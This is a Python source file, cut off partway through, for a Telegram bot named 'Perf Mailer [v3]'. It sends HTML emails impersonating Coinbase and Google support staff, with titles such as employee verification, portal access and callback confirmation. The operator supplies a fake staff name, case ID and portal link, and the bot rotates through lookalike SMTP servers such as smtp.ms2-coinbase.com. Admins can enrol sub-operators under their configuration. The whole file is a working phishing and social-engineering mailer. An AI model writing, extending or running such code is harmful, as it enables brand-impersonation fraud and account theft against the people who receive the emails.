import json
import os
import smtplib
import time
import threading
import concurrent.futures
import asyncio
import logging
import logging.handlers

from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.utils import formataddr

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
     ApplicationBuilder,
     CommandHandler,
     CallbackQueryHandler,
     MessageHandler,
     ContextTypes,
     filters
)

# int - start0
def init_globals(
     config_path: str = 'config.json',
     users_path: str  = 'backend/database/users.json'
):
     try:
          with open(config_path, 'r') as f:
               config = json.load(f)
     except FileNotFoundError:
          logging.critical(f"CRITICAL: Configuration file '{config_path}' not found. Bot cannot start.")
          print(f"CRITICAL: Configuration file '{config_path}' not found. Bot cannot start.")
          exit(1)
     except json.JSONDecodeError as e:
          logging.critical(f"CRITICAL: Configuration file '{config_path}' is not valid JSON: {e}. Bot cannot start.")
          print(f"CRITICAL: Configuration file '{config_path}' is not valid JSON: {e}. Bot cannot start.")
          exit(1)
     except Exception as e:
          logging.critical(f"CRITICAL: Unexpected error loading configuration file '{config_path}': {e}. Bot cannot start.", exc_info=True)
          print(f"CRITICAL: Unexpected error loading configuration file '{config_path}': {e}. Bot cannot start.")
          exit(1)

     token = config.get('telegram', {}).get('token') or config.get('telegram', {}).get('botauth')
     if not token:
          logging.critical("CRITICAL: Telegram token not found in configuration. 'telegram.token' or 'telegram.botauth' must be set. Bot cannot start.")
          print("CRITICAL: Telegram token not found in configuration. 'telegram.token' or 'telegram.botauth' must be set. Bot cannot start.")
          exit(1)

     try:
          with open(users_path, 'r') as f:
               users = json.load(f)
     except FileNotFoundError:
          logging.warning(f"WARNING: Users file '{users_path}' not found. Initializing with empty users dictionary.")
          users = {} # Initialize with empty users if file not found, bot might still be usable for some admin tasks
     except json.JSONDecodeError as e:
          logging.error(f"ERROR: Users file '{users_path}' is not valid JSON: {e}. Initializing with empty users dictionary.")
          users = {}
     except Exception as e:
          logging.error(f"ERROR: Unexpected error loading users file '{users_path}': {e}. Initializing with empty users dictionary.", exc_info=True)
          users = {}

     return config, token, users, users_path

CONFIG, TOKEN, USERS, USERS_PATH = init_globals()

# Logging Setup
def setup_logging():
    log_config = CONFIG.get('logging', {})
    if log_config.get('enabled', False):
        log_level_str = log_config.get('log_level', 'INFO').upper()
        log_level = getattr(logging, log_level_str, logging.INFO)

        log_file = log_config.get('log_file', 'logs/mailer.log')
        # Ensure log directory exists
        os.makedirs(os.path.dirname(log_file), exist_ok=True)

        logger = logging.getLogger() # Get root logger
        logger.setLevel(log_level)

        formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')

        # Rotating File Handler
        # Rotate after 5MB, keep 5 backup files
        rfh = logging.handlers.RotatingFileHandler(log_file, maxBytes=5*1024*1024, backupCount=5, encoding='utf-8')
        rfh.setFormatter(formatter)
        logger.addHandler(rfh)

        # Console Handler (optional, could be controlled by config too)
        sh = logging.StreamHandler()
        sh.setFormatter(formatter)
        # You might want a different level for console, e.g., INFO, while file is DEBUG
        # For now, same as root logger.
        logger.addHandler(sh)

        logging.info("Logging initialized.")
    else:
        logging.disable(logging.CRITICAL) # Disable all logging if not enabled

setup_logging()

# E | state(s)
e_state = {}
t_state = {}
s_state = {}
cb_state = {}    # <--- state for callback date/time

# SMTP Rate Limiting
smtp_locks = {}  # To store a lock for each SMTP server config (host_port_user)
smtp_last_send_time = {} # To store the last send time for each SMTP server config

# USERS file lock
users_file_lock = threading.Lock()

# auth helpers
def is_authorized(
     user_id: int
):
     return str(
          user_id
     ) in USERS

def is_admin(
     user_id: int
):
     return USERS.get(
          str(
               user_id
          ),
          {}
     ).get(
          'user_info',
          {}
     ).get(
          'admin',
          False
     )

# list the friendly SMTP display names
def smtp_servers(
     service: str
):
     # Safely access nested keys
     service_config = CONFIG.get('smtp', {}).get(service, {})
     servers_list = service_config.get('servers', [])
     return [srv.get('display', 'N/A') for srv in servers_list if isinstance(srv, dict)]

# find the full entry by its display name
def smtp_entry(
     service: str,
     display: str
):
     servers = CONFIG['smtp'][service].get('servers', [])
     if not servers:
          # Log this situation or raise a more specific error
          logging.error(f"No SMTP servers configured for service: {service}")
          return None # Or raise an exception like ValueError
     for srv in servers:
          if srv['display'] == display:
               return srv
     # If preferred display name not found, default to the first server in the list
     return servers[0]

# resolve inherited config for under-users
MAX_E_UI_DEPTH = 5 # Max depth for E_ui recursion to prevent cycles

def E_ui(
     user_id: int,
     _depth: int = 0 # Internal depth counter
):
     if _depth > MAX_E_UI_DEPTH:
          logging.warning(f"E_ui reached max recursion depth for user_id {user_id}. Possible circular 'under' reference.")
          # Fallback: return current user's direct info if possible, or None/error
          original_user_info = USERS.get(str(user_id), {}).get('user_info')
          if original_user_info:
              return original_user_info
          return {} # Return empty dict or handle error appropriately

     user_info_str_id = str(user_id)
     if user_info_str_id not in USERS:
          logging.warning(f"User ID {user_id} not found in USERS during E_ui call (depth: {_depth}).")
          return {} # Or handle as an error

     ui = USERS[user_info_str_id].get('user_info')
     if not ui:
          logging.warning(f"User info dict missing for user ID {user_id} in USERS (depth: {_depth}).")
          return {} # Or handle as an error

     under_admin_id = ui.get('under')

     # Ensure under_admin_id is not the same as user_id to break immediate self-reference
     if under_admin_id is not None and str(under_admin_id) != user_info_str_id:
          # It's important that E_ui can handle non-string IDs if 'under' stores them as int
          return E_ui(
               under_admin_id, # Pass potentially int ID
               _depth + 1
          )
     return ui

# template loader(s)
def load_template(
     template_key: str
):
     if template_key.startswith(
          'cb'
     ):
          service = 'coinbase'
          subdir  = template_key[2:]
     elif template_key.startswith(
          'g'
     ):
          service = 'google'
          subdir  = template_key[1:]
     else:
          service = 'coinbase'
          subdir  = template_key

     path = os.path.join(
          'templates',
          service,
          subdir,
          'index.html'
     )
     return open(
          path,
          'r',
          encoding='utf-8'
     ).read()

# base email sender
def send_email(
     to_email:     str,
     subject:      str,
     html_content: str,
     smtp_config:  dict,
     display_name: str = 'Service'
):
     message = MIMEMultipart(
          'alternative'
     )
     message['Subject'] = subject
     message['From']    = formataddr(
          (
               display_name,
               smtp_config['username']
          )
     )
     message['To']      = to_email
     message.attach(
          MIMEText(
               html_content,
               'html'
          )
     )

     start_time = time.time()
     try:
          with smtplib.SMTP_SSL(
               smtp_config['server'],
               smtp_config['port']
          ) as server:
               server.login(
                    smtp_config['username'],
                    smtp_config['password']
               )
               server.sendmail(
                    smtp_config['username'],
                    to_email,
                    message.as_string()
               )
          eta = round(time.time() - start_time, 1)
          domain = smtp_config['username'].split('@')[-1]
          return eta, f"smtp.{domain}"
     except Exception as e:
          # Propagate the exception to be handled by the caller
          raise e

# Worker function for concurrent email sending
async def send_email_worker(email_details: dict, context: ContextTypes.DEFAULT_TYPE):
     """
     Worker function to send a single email using a specific SMTP server.
     Handles locking, rate limiting, and calls the core send_email function.
     Reports status back via Telegram message.
     """
     to_email = email_details['to_email']
     subject = email_details['subject']
     html_content = email_details['html_content']
     smtp_config = email_details['smtp_config']
     display_name = email_details['display_name']
     update = email_details['update'] # Telegram update object for replying

     smtp_key = f"{smtp_config['server']}:{smtp_config['port']}:{smtp_config['username']}"

     if smtp_key not in smtp_locks:
          smtp_locks[smtp_key] = threading.Lock() # Should ideally be pre-initialized

     acquired = False
     try:
          # Try to acquire the lock without blocking indefinitely to allow other tasks to proceed
          # if this particular SMTP is busy or rate-limited.
          # However, for strict rate-limiting per SMTP, blocking acquisition is needed.
          # Let's stick to blocking acquisition as per the current design.
          smtp_locks[smtp_key].acquire()
          acquired = True

          current_time = time.time()
          last_sent = smtp_last_send_time.get(smtp_key, 0)

          if current_time - last_sent < 60: # 60 seconds cooldown
               if acquired:
                    try: # Ensure release happens even if logging fails, though unlikely
                         smtp_locks[smtp_key].release()
                    except RuntimeError: # Already unlocked
                         pass
               logging.info(f"COOLDOWN: SMTP {smtp_config['display']} on cooldown. Task for {to_email} skipped by worker.")
               return f"COOLDOWN:{smtp_config['display']}:{to_email}"

          try:
               logging.debug(f"Attempting to send email to {to_email} via {smtp_config['display']}")
               eta, host_info = send_email(
                    to_email,
                    subject,
                    html_content,
                    smtp_config,
                    display_name
               )
               smtp_last_send_time[smtp_key] = time.time()
               logging.info(f"SUCCESS: Email to {to_email} via {smtp_config['display']} ({host_info}). ETA: {eta}s")
               return f"SUCCESS:{smtp_config['display']}:{to_email}"
          except Exception as e:
               logging.error(f"FAILURE: Email to {to_email} via {smtp_config['display']}. Error: {e}", exc_info=True)
               return f"FAILURE:{smtp_config['display']}:{to_email}:{e}"
     finally:
          if acquired:
               try:
                    if smtp_locks[smtp_key].locked(): # Check if current thread holds the lock
                         smtp_locks[smtp_key].release()
               except RuntimeError: # Already unlocked or lock object deleted (should not happen here)
                    logging.warning(f"RuntimeError during lock release for {smtp_key}. Might have been released already.")
               except Exception as e_rl: # Catch any other potential error during release
                    logging.error(f"Unexpected error releasing lock for {smtp_key}: {e_rl}", exc_info=True)


# menu builders
def b_main():
     buttons = [
          [
               InlineKeyboardButton(
                    "🛠️ Config",
                    callback_data="go_config"
               ),
               InlineKeyboardButton(
                    "📨 Support",
                    url="https://t.me/vineotter12"
               )
          ],
          [
               InlineKeyboardButton(
                    "📁 Coinbase",
                    callback_data="go_coinbase"
               ),
               InlineKeyboardButton(
                    "🌐 Google",
                    callback_data="go_google"
               )
          ]
     ]
     return InlineKeyboardMarkup(
          buttons
     )

def b_config(
     user_id: int
):
     real_ui = USERS[str(
          user_id
     )]['user_info']
     ui      = E_ui(
          user_id
     )
     all_cb  = smtp_servers('coinbase')
     all_g   = smtp_servers('google')
     text    = (
          f"🛠️ *Your \\[ Config \\]*\n"
          f"Employee: `{ui.get('staff_name','N/A')}`\n"
          f"Case ID: `{ui.get('case_id','N/A')}`\n"
          f"Portal URL: `{ui.get('portal_url','N/A')}`\n\n"
          f"SMTP Server\\(s\\):\n"
          f" • Coinbase: `{' | '.join(all_cb)}`\n"
          f" • Google:   `{' | '.join(all_g)}`"
     )

     buttons = []
     if real_ui.get('can_edit', True):
          buttons += [
               [
                    InlineKeyboardButton(
                         "Edit Employee Name",
                         callback_data="edit_staff_name"
                    ),
                    InlineKeyboardButton(
                         "Edit Case ID",
                         callback_data="edit_case_id"
                    )
               ],
               [
                    InlineKeyboardButton(
                         "Edit Portal URL",
                         callback_data="edit_portal_url"
                    ),
                    InlineKeyboardButton(
                         "Change SMTP",
                         callback_data="edit_smtp"
                    )
               ]
          ]

     buttons.append([
          InlineKeyboardButton(
               "🔙 Back",
               callback_data="go_home"
          )
     ])

     if not real_ui.get('can_edit', True):
          text += "\n\n🔒 This config is managed by your admin and cannot be edited"
          buttons = [buttons[-1]]

     return text, InlineKeyboardMarkup(
          buttons
     )

def b_coinbase():
     buttons = [
          [
               InlineKeyboardButton(
                    "👤 Employee Verification",
                    callback_data="cbemployee"
               ),
               InlineKeyboardButton(
                    "🧷 Panel Access",
                    callback_data="cbpanel"
               )
          ],
          [
               InlineKeyboardButton(
                    "🎫 Ticket Update",
                    callback_data="cbticket"
               ),
               InlineKeyboardButton(
                    "📞 Callback Confirmation",
                    callback_data="cbcallback"
               )
          ],
          [
               InlineKeyboardButton(
                    "🔙 Back",
                    callback_data="go_home"
               )
          ]
     ]
     return (
          "📁 Coinbase Commands\n\nPlease update your config before using these templates",
          InlineKeyboardMarkup(
               buttons
          )
     )

def b_google():
     buttons = [
          [
               InlineKeyboardButton(
                    "👤 Support Verification",
                    callback_data="gemployee"
               ),
               InlineKeyboardButton(
                    "🧷 Secure Portal Access",
                    callback_data="gpanel"
               )
          ],
          [
               InlineKeyboardButton(
                    "🔙 Back",
                    callback_data="go_home"
               )
          ]
     ]
     return (
          "📁 Google Commands\n\nPlease update your config before using these templates",
          InlineKeyboardMarkup(
               buttons
          )
     )

async def start(
     update: Update,
     context: ContextTypes.DEFAULT_TYPE
):
     user_id = update.effective_user.id
     if not is_authorized(
          user_id
     ):
          return
     intro  = "Perf Mailer [v3]"
     markup = b_main()
     if update.callback_query:
          await update.callback_query.answer()
          await update.callback_query.edit_message_text(
               intro,
               reply_markup=markup
          )
     else:
          await update.message.reply_text(
               intro,
               reply_markup=markup
          )

async def under(
     update: Update,
     context: ContextTypes.DEFAULT_TYPE
):
     admin_id = update.effective_user.id
     if not is_admin(
          admin_id
     ):
          return
     if len(
          context.args
     ) != 1 or not context.args[0].isdigit():
          await update.message.reply_text(
               "Usage: /under [new_user_id]"
          )
          return
     new_id = context.args[0]
     if new_id in USERS:
          await update.message.reply_text(
               f"User {new_id} already exists."
          )
          return
     USERS[new_id] = {
          "id": int(
               new_id
          ),
          "user_info": {
               "admin":    False,
               "under":    admin_id,
               "can_edit": False
          }
     }
     try:
          with users_file_lock:
               # Re-read users file before modification if multiple updates can happen
               # For now, assuming USERS global is the source of truth during this operation
               with open(USERS_PATH, 'w') as f:
                    json.dump(USERS, f, indent=4)
          logging.info(f"User {new_id} added under admin {admin_id}.")
          await update.message.reply_text(
               f"[OK] User {new_id} added under your config; they cannot edit it."
          )
     except Exception as e:
          logging.error(f"Failed to save user data for new user {new_id} under admin {admin_id}: {e}", exc_info=True)
          await update.message.reply_text("An error occurred while saving user data. Please try again.")


async def config(
     update: Update,
     context: ContextTypes.DEFAULT_TYPE
):
     user_id = update.effective_user.id
     if not is_authorized(
          user_id
     ):
          return
     text, markup = b_config(
          user_id
     )
     if update.callback_query:
          await update.callback_query.answer()
          await update.callback_query.edit_message_text(
               text,
               reply_markup=markup,
               parse_mode='MarkdownV2'
          )
     else:
          await update.message.reply_text(
               text,
               reply_markup=markup,
               parse_mode='MarkdownV2'
          )

async def support_cmd(
     update: Update,
     context: ContextTypes.DEFAULT_TYPE
):
     if not is_authorized(
          update.effective_user.id
     ):
          return
     await update.message.reply_text(
          "contact @ for support issues"
     )

async def template_cmd(
     update: Update,
     context: ContextTypes.DEFAULT_TYPE,
     key: str,
     title: str
):
     user_id = update.effective_user.id
     if not is_authorized(
          user_id
     ) or len(
          context.args
     ) != 1:
          return
     recipient = context.args[0]
     ui        = E_ui(user_id) # Assuming E_ui is robust enough or handled if ui is None
     if not ui: # Should not happen if user is authorized, but good check
          logging.error(f"Could not retrieve user info for authorized user {user_id} in template_cmd.")
          await update.message.reply_text("Error: Could not retrieve your user configuration.")
          return

     try:
          tpl = load_template(key)
          if tpl is None: # Assuming load_template could return None on error (though it raises FileNotFoundError)
               await update.message.reply_text(f"Error: Template '{key}' could not be loaded.")
               return
     except FileNotFoundError:
          logging.error(f"Template file not found for key '{key}' in template_cmd for user {user_id}.")
          await update.message.reply_text(f"Error: Template file for '{key}' not found. Please contact admin.")
          return
     except Exception as e:
          logging.error(f"Error loading template '{key}' in template_cmd for user {user_id}: {e}", exc_info=True)
          await update.message.reply_text(f"An unexpected error occurred while loading the template. Please contact admin.")
          return

     html      = tpl.replace( # This line will now be safe due to checks above
          '{staff_name}',   ui.get('staff_name', 'N/A') # Use .get for safety
     ).replace(
          '{ticket_number}',ui['case_id']
     ).replace(
          '{case}',         ui['case_id']
     ).replace(
          '{panel_url}',    ui['portal_url']
     ).replace(
          '{portal_link}',  ui['portal_url']
     ).replace(
          '{domain}',       ui.get('portal_url', 'N/A') # Use .get for safety
     )
     service = 'coinbase' if key.startswith('cb') else 'google'

     service_config = CONFIG['smtp'].get(service)
     if not service_config:
          logging.error(f"SMTP service '{service}' not found in configuration for user {user_id}, template {key}.")
          await update.message.reply_text(f"Error: SMTP configuration for service '{service}' is missing. Contact admin.")
          return

     all_service_smtps = service_config.get('servers', [])
     if not all_service_smtps:
          logging.warning(f"No SMTP servers listed for service '{service}' for user {user_id}, template {key}.")
          await update.message.reply_text(f"Error: No SMTP servers available for service '{service}'. Contact admin.")
          return

     svc_port = service_config.get('port')
     if svc_port is None: # Port is essential
          logging.error(f"Port not configured for SMTP service '{service}' for user {user_id}, template {key}.")
          await update.message.reply_text(f"Error: Port missing for SMTP service '{service}'. Contact admin.")
          return

     disp_name = ' ' if service == 'coinbase' else 'Google' # This could be more dynamic if more services are added

     # Get user's preferred SMTP or default to the first one
     # all_service_smtps is guaranteed to be non-empty here by the check above.
     preferred_disp = ui.get(f'smtp_{service}', all_service_smtps[0]['display'])

     # Create a prioritized list of SMTP entries
     sorted_smtp_entries = sorted(
          all_service_smtps,
          key=lambda s: s['display'] != preferred_disp # False (0) for preferred, True (1) for others
     )

     sent_successfully = False
     logging.info(f"User {user_id} initiating single email send (template_cmd) for template '{key}' to '{recipient}'. Available SMTPs for '{service}': {[s['display'] for s in sorted_smtp_entries]}. Preferred: {preferred_disp}")
     for entry in sorted_smtp_entries:
          smtp_config = {
               'server':   entry['host'],
               'port':     svc_port, # Use common service port
               'username': entry['username'],
               'password': entry['password'],
               'display':  entry['display'] # For logging and lock key
          }

          # Unique key for this SMTP config for locking and rate limiting
          smtp_key = f"{smtp_config['server']}:{smtp_config['port']}:{smtp_config['username']}"

          if smtp_key not in smtp_locks:
               smtp_locks[smtp_key] = threading.Lock()

          with smtp_locks[smtp_key]:
               current_time = time.time()
               last_sent = smtp_last_send_time.get(smtp_key, 0)

               if current_time - last_sent < 60: # 1 minute cooldown
                    logging.info(f"COOLDOWN: SMTP {smtp_config['display']} on cooldown for user {user_id}, recipient {recipient} (template_cmd). Skipping.")
                    await update.message.reply_text(
                         f"⏳ SMTP `{smtp_config['display']}` is on cooldown. Trying next...",
                         parse_mode='Markdown'
                    )
                    continue # Try next SMTP server

               try:
                    logging.info(f"User {user_id} attempting single send to {recipient} via {smtp_config['display']} using template {key} (template_cmd).")
                    eta, host_info = send_email(
                         recipient,
                         title,
                         html,
                         smtp_config,
                         disp_name
                    )
                    smtp_last_send_time[smtp_key] = current_time
                    logging.info(f"SUCCESS: Single send for user {user_id} to {recipient} via {smtp_config['display']} (template {key}) successful. ETA: {eta}s.")
                    await update.message.reply_text(
                         f"✅ Success\n"
                         f"📤 SMTP: `{host_info}` (used `{smtp_config['display']}`)\n"
                         f"⏱️ ETA: `{eta}` seconds\n"
                         f"📧 Recipient: `{recipient}`",
                         parse_mode='Markdown'
                    )
                    sent_successfully = True
                    break # Email sent, exit loop
               except smtplib.SMTPRecipientsRefused as e:
                    logging.warning(f"SMTPRecipientsRefused for user {user_id} with {smtp_config['display']} for {recipient} (template {key}): {e}")
                    await update.message.reply_text(
                         f"⚠️ SMTP Error (Recipients Refused) with `{smtp_config['display']}`: {e}. Trying next...",
                         parse_mode='Markdown'
                    )
               except smtplib.SMTPAuthenticationError as e:
                    logging.warning(f"SMTPAuthenticationError for user {user_id} with {smtp_config['display']} for {recipient} (template {key}): {e}")
                    await update.message.reply_text(
                         f"🚫 SMTP Error (Authentication Failed) with `{smtp_config['display']}`: {e}. Trying next...",
                         parse_mode='Markdown'
                    )
               except Exception as e: # Catch other SMTP related errors
                    logging.error(f"General SMTP Error for user {user_id} with {smtp_config['display']} for {recipient} (template {key}): {e}", exc_info=True)
                    await update.message.reply_text(
                         f"❌ SMTP Error with `{smtp_config['display']}`: {e}. Trying next...",
                         parse_mode='Markdown'
                    )

     if not sent_successfully:
          logging.warning(f"Failed to send email for user {user_id} to {recipient} using template {key} after trying all SMTPs for {service} (template_cmd).")
          await update.message.reply_text(
               f"😔 Failed to send email to `{recipient}` after trying all available SMTP servers for {service}.",
               parse_mode='Markdown'
          )

# menu mapping
MENU_MAP = {
     'cbemployee': (
          'cbemployee',
          'Coinbase Employee Verification'
     ),
     'cbpanel': (
          'cbpanel',
          'Secure Support Portal Access'
     ),
     'cbticket': (
          'cbticket',
          'Coinbase Ticket Update'
     ),
     'cbcallback': (
          'callback',
          'Coinbase Callback Confirmation'
     ),
     'gemployee': (
          'gemployee',
          'Google Support Representative Verification'
     ),
     'gpanel': (
          'gpanel',
          'Google Secure Portal Access'
     )
}

async def button_handler(
     update: Update,
     context: ContextTypes.DEFAULT_TYPE
):
     query   = update.callback_query
     await query.answer()
     user_id = query.from_user.id
     data    = query.data

     if not is_authorized(
          user_id
     ):
          return
     if data == 'go_home':
          return await start(
               update,
               context
          )
     if data == 'go_config':
          return await config(
               update,
               context
          )
     if data == 'go_coinbase':
          txt, menu = b_coinbase()
          return await query.edit_message_text(
               txt,
               reply_markup=menu
          )
     if data == 'go_google':
          txt, menu = b_google()
          return await query.edit_message_text(
               txt,
               reply_markup=menu
          )
     if data == 'edit_smtp':
          all_cb = smtp_servers('coinbase')
          all_g  = smtp_servers('google')
          prompt = (
               "Here are all our current smtps:\n\n"
               "SMTP Servers:\n"
               f"1: Coinbase: `{' | '.join(all_cb)}`\n"
               f"2: Google:   `{' | '.join(all_g)}`\n\n"
               "Type `1 smtp.ms2-coinbase.com` to set primary for Coinbase,\n"
               "or `2 smtp.mx1-google.com` to set primary for Google."
          )
          s_state[user_id] = True
          return await query.edit_message_text(
               prompt,
               parse_mode='Markdown'
          )
     if data.startswith(
          'edit_'
     ):
          field = data.split(
               '_',
               1
          )[1]
          e_state[
               user_id
          ] = field
          return await query.edit_message_text(
               f"[!] Send new: {field.replace('_',' ').title()}:"
          )

     if data == 'cbcallback':
          cb_state[user_id] = {
               'key':    'callback',
               'title':  'Coinbase Callback Confirmation'
          }
          return await query.edit_message_text(
               "Please send date and time, example: 4PM March 7th"
          )

     if data in MENU_MAP:
          key, title = MENU_MAP[
               data
          ]
          t_state[
               user_id
          ] = {
               'key': key,
               'title': title
          }
          return await query.edit_message_text(
               f"✉️ Send recipient email for {title}:"
          )

async def message_input(
     update: Update,
     context: ContextTypes.DEFAULT_TYPE
):
     user_id = update.effective_user.id
     if not is_authorized(
          user_id
     ):
          return
     text     = update.message.text.strip()

     # handle free-text SMTP change
     if user_id in s_state:
          parts = text.split(maxsplit=1)
          if len(parts) != 2 or parts[0] not in ('1','2'):
               await update.message.reply_text(
                    "invalid pickings, type: -> `1 smtp.example.com` or `2 smtp.example.com`.",
                    parse_mode='Markdown'
               )
               return # s_state remains for user to retry

          idx, chosen = parts
          user_str_id = str(user_id)

          try:
               with users_file_lock:
                    if user_str_id not in USERS or 'user_info' not in USERS[user_str_id]:
                         USERS.setdefault(user_str_id, {}).setdefault('user_info', {}) # Ensure structure

                    ui = USERS[user_str_id]['user_info']
                    field_name = 'smtp_coinbase' if idx == '1' else 'smtp_google'
                    old_value = ui.get(field_name)
                    ui[field_name] = chosen

                    with open(USERS_PATH, 'w') as f:
                         json.dump(USERS, f, indent=4)

               logging.info(f"User {user_id} updated {field_name} from '{old_value}' to '{chosen}'.")
               s_state.pop(user_id, None)
               # Call config to show updated settings
               # Ensure config() is an async function that can be awaited directly
               await config(update, context) # Assuming config is designed to be called this way
               return # Explicitly return after handling
          except Exception as e:
               logging.error(f"Error saving SMTP preference for user {user_id}: {e}", exc_info=True)
               await update.message.reply_text("An error occurred while saving your SMTP preference. Please try again.")
               # s_state is not popped, so user might retry.
               return

     # config edits
     if user_id in e_state:
          field_to_edit = e_state.pop(user_id) # Pop early to prevent re-entry if save fails
          user_str_id = str(user_id)
          try:
               with users_file_lock:
                    if user_str_id not in USERS or 'user_info' not in USERS[user_str_id]:
                         USERS.setdefault(user_str_id, {}).setdefault('user_info', {})

                    old_value = USERS[user_str_id]['user_info'].get(field_to_edit)
                    USERS[user_str_id]['user_info'][field_to_edit] = text

                    with open(USERS_PATH, 'w') as f:
                         json.dump(USERS, f, indent=4)

               logging.info(f"User {user_id} updated config field '{field_to_edit}' from '{old_value}' to '{text}'.")
               # Call config to show updated settings
               await config(update, context)
               return
          except Exception as e:
               logging.error(f"Error saving config field '{field_to_edit}' for user {user_id}: {e}", exc_info=True)
               await update.message.reply_text(f"An error occurred while saving '{field_to_edit}'. Please try again.")
               # e_state was popped, so user would need to restart edit process. Consider re-adding to e_state if retry is desired.
               return

     # capture callback date/time
     if user_id in cb_state:
          st = cb_state.pop(user_id)
          t_state[user_id] = {
               'key':             st['key'],
               'title':           st['title'],
               'callback_window': text
          }
          return await update.message.reply_text(
               f"✉️ Send recipient email for {st['title']}:"
          )

     # template send-outs (including callback (xx-xx-xx-00))
     if user_id in t_state:
          st    = t_state.pop(
               user_id
          )
          key   = st['key']
          title = st['title']
          ui    = E_ui(user_id)
          if not ui:
               logging.error(f"Could not retrieve user info for authorized user {user_id} in message_input.")
               await update.message.reply_text("Error: Could not retrieve your user configuration.")
               return # t_state already popped, so this is a terminal state for this interaction

          try:
               tpl = load_template(key)
               if tpl is None:
                    await update.message.reply_text(f"Error: Template '{key}' could not be loaded.")
                    return
          except FileNotFoundError:
               logging.error(f"Template file not found for key '{key}' in message_input for user {user_id}.")
               await update.message.reply_text(f"Error: Template file for '{key}' not found. Please contact admin.")
               return
          except Exception as e:
               logging.error(f"Error loading template '{key}' in message_input for user {user_id}: {e}", exc_info=True)
               await update.message.reply_text(f"An unexpected error occurred while loading the template. Please contact admin.")
               return

          html  = tpl.replace(
               '{staff_name}',   ui.get('staff_name', 'N/A')
          ).replace(
               '{ticket_number}',ui.get('case_id', 'N/A')
          ).replace(
               '{case}',         ui['case_id']
          ).replace(
               '{panel_url}',    ui['portal_url']
          ).replace(
               '{portal_link}',  ui['portal_url']
          ).replace(
               '{domain}',       ui['portal_url']
          )
          if key == 'callback':
               html = html.replace(
                    '{callback_window}',
                    st.get('callback_window', '')
               )
               service = 'coinbase'
          else:
               service = 'coinbase' if key.startswith('cb') else 'google'

          recipient_email = text # User's message is the recipient email

          service_config = CONFIG['smtp'].get(service)
          if not service_config:
               logging.error(f"SMTP service '{service}' not found in configuration for user {user_id}, template {key} (message_input).")
               await update.message.reply_text(f"Error: SMTP configuration for service '{service}' is missing. Contact admin.")
               return

          all_service_smtps = service_config.get('servers', [])
          if not all_service_smtps:
               logging.warning(f"No SMTP servers listed for service '{service}' for user {user_id}, template {key} (message_input).")
               await update.message.reply_text(f"Error: No SMTP servers available for service '{service}'. Contact admin.")
               return

          svc_port = service_config.get('port')
          if svc_port is None: # Port is essential
               logging.error(f"Port not configured for SMTP service '{service}' for user {user_id}, template {key} (message_input).")
               await update.message.reply_text(f"Error: Port missing for SMTP service '{service}'. Contact admin.")
               return

          disp_name = ' ' if service == 'coinbase' else 'Google' # This could be more dynamic

          # Get user's preferred SMTP or default to the first one
          # all_service_smtps is guaranteed non-empty here
          preferred_disp = ui.get(f'smtp_{service}', all_service_smtps[0]['display'])

          # Create a prioritized list of SMTP entries
          sorted_smtp_entries = sorted(
               all_service_smtps,
               key=lambda s: s['display'] != preferred_disp # False (0) for preferred, True (1) for others
          )

          sent_successfully = False
          logging.info(f"User {user_id} initiating single email send (message_input) for template '{key}' to '{recipient_email}'. Available SMTPs for '{service}': {[s['display'] for s in sorted_smtp_entries]}. Preferred: {preferred_disp}")
          for entry in sorted_smtp_entries: # This loop and the logging call above should align with sent_successfully
               smtp_config = {
                    'server':   entry['host'],
                    'port':     svc_port,
                    'username': entry['username'],
                    'password': entry['password'],
                    'display':  entry['display']
               }

               smtp_key = f"{smtp_config['server']}:{smtp_config['port']}:{smtp_config['username']}"

               if smtp_key not in smtp_locks:
                    smtp_locks[smtp_key] = threading.Lock()

               with smtp_locks[smtp_key]:
                    current_time = time.time()
                    last_sent = smtp_last_send_time.get(smtp_key, 0)

                    if current_time - last_sent < 60: # 1 minute cooldown
                         logging.info(f"COOLDOWN: SMTP {smtp_config['display']} on cooldown for user {user_id}, recipient {recipient_email} (message_input). Skipping.")
                         await update.message.reply_text(
                              f"⏳ SMTP `{smtp_config['display']}` is on cooldown. Trying next...",
                              parse_mode='Markdown'
                         )
                         continue

                    try:
                         logging.info(f"User {user_id} attempting single send to {recipient_email} via {smtp_config['display']} using template {key} (message_input).")
                         eta, host_info = send_email(
                              recipient_email,
                              title,
                              html,
                              smtp_config,
                              disp_name
                         )
                         smtp_last_send_time[smtp_key] = current_time
                         logging.info(f"SUCCESS: Single send for user {user_id} to {recipient_email} via {smtp_config['display']} (template {key}) successful. ETA: {eta}s.")
                         await update.message.reply_text(
                              f"✅ Success\n"
                              f"📤 SMTP: `{host_info}` (used `{smtp_config['display']}`)\n"
                              f"⏱️ ETA: `{eta}` seconds\n"
                              f"📧 Recipient: `{recipient_email}`",
                              parse_mode='Markdown'
                         )
                         sent_successfully = True
                         # Using 'return' here as message_input is an async handler that should conclude after a successful send.
                         return
                    except smtplib.SMTPRecipientsRefused as e:
                         logging.warning(f"SMTPRecipientsRefused for user {user_id} with {smtp_config['display']} for {recipient_email} (template {key}, message_input): {e}")
                         await update.message.reply_text(
                              f"⚠️ SMTP Error (Recipients Refused) with `{smtp_config['display']}`: {e}. Trying next...",
                              parse_mode='Markdown'
                         )
                    except smtplib.SMTPAuthenticationError as e:
                         logging.warning(f"SMTPAuthenticationError for user {user_id} with {smtp_config['display']} for {recipient_email} (template {key}, message_input): {e}")
                         await update.message.reply_text(
                              f"🚫 SMTP Error (Authentication Failed) with `{smtp_config['display']}`: {e}. Trying next...",
                              parse_mode='Markdown'
                         )
                    except Exception as e:
                         logging.error(f"General SMTP Error for user {user_id} with {smtp_config['display']} for {recipient_email} (template {key}, message_input): {e}", exc_info=True)
                         await update.message.reply_text(
                              f"❌ SMTP Error with `{smtp_config['display']}`: {e}. Trying next...",
                              parse_mode='Markdown'
                         )

          if not sent_successfully:
               logging.warning(f"Failed to send email for user {user_id} to {recipient_email} using template {key} after trying all SMTPs for {service} (message_input).")
               # Ensure this return is also an await if it's the last thing in an async function and it calls an async func
               await update.message.reply_text(
                    f"😔 Failed to send email to `{recipient_email}` after trying all available SMTP servers for {service}.",
                    parse_mode='Markdown'
               )
               return # Exit if no email sent

async def adduser(
     update: Update,
     context: ContextTypes.DEFAULT_TYPE
):
     uid = update.effective_user.id
     if not is_admin(
          uid
     ):
          return
     if len(
          context.args
     ) != 1 or not context.args[0].isdigit():
          return
     new = context.args[0]
     if new in USERS:
          return

     USERS[
          new
     ] = {
